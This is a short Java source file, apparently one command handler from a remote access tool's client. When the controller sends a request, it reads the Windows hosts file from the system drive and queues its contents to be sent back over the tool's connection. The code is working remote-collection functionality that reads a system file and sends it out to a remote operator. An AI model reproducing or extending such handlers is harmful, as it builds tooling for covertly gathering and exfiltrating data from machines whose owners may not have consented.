package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;


public class PacketGETHOSTFI extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts")));
			String tosend = "";
			while ((line = reader.readLine()) != null) {
				tosend += line + "\n";
			}
			Connection.addToSendQueue(new PacketBuilder(Header.HOST_FILE, tosend));
			reader.close();
		}
	}

}
